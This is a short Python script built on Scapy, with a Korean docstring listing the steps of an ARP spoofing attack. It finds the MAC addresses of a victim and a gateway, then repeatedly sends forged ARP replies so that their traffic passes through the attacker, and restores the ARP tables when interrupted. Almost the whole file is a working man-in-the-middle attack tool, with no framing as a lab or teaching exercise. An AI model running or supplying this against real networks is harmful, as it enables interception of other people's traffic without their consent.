'''
1. 브로드캐스트를 통한 공격 대상과 Gateway의 MAC 주소 추출

2. 알아낸 정보를 이용하여 공격 대상과 게이트웨이에게 공격자가 송수신자인 것처럼 ARP 프레임을 전송

3. 원래는 공격 대상과 게이트웨이에게 갈 패킷들이 공격자에게 전송되기 때문에 이를 다시 원래 목적지로 포워딩
'''

from scapy.all import *
from scapy.layers.l2 import Ether, ARP
import sys

def getMAC(ip):
    ans, unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=5, retry=3, verbose=False)

    print("ans:", ans)
    if ans:
        return ans[0][1].src

def ARPspoof(srcIP, targetIP, targetMAC):
    arp = ARP(op=2, psrc=srcIP, pdst=targetIP, hwdst=targetMAC)
    send(arp)

def restoreARP(victimIP, gatewayIP, victimMAC, gatewayMAC):
    arp1=ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gatewayMAC)
    arp2=ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=victimMAC)
    send(arp1, count=3)
    send(arp2, count=3)

def main(gatewayIP, victimIP):
    victimMAC = getMAC(victimIP)
    gatewayMAC = getMAC(gatewayIP)

    print("victimMAC:",victimMAC)
    print("victimIP:", victimIP)

    print("gatewayMAC:", gatewayMAC)
    print("gatewayIP:", gatewayIP)

    if victimMAC == None or gatewayMAC == None:
        print("Cannot find MAC address")
        exit()

    print(f'Start Spoofing -> VICTIM IP {victimIP}')
    print(f'{victimIP}: POISON ARP Table {gatewayMAC} -> {victimMAC}')

    try:
        while 1:
            ARPspoof(gatewayIP, victimIP, victimMAC)
            ARPspoof(victimIP, gatewayIP, gatewayMAC)
            __import__('time').sleep(3)
    except KeyboardInterrupt:
        restoreARP(victimIP, gatewayIP, victimMAC, gatewayMAC)
        print("terminated Spoofing -> RESTORED ARP TABLE")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python arp.py {client IP address} {gateway IP address}")
        exit()
    victimIP = sys.argv[1]
    gatewayIP = sys.argv[2]

    main(gatewayIP, victimIP)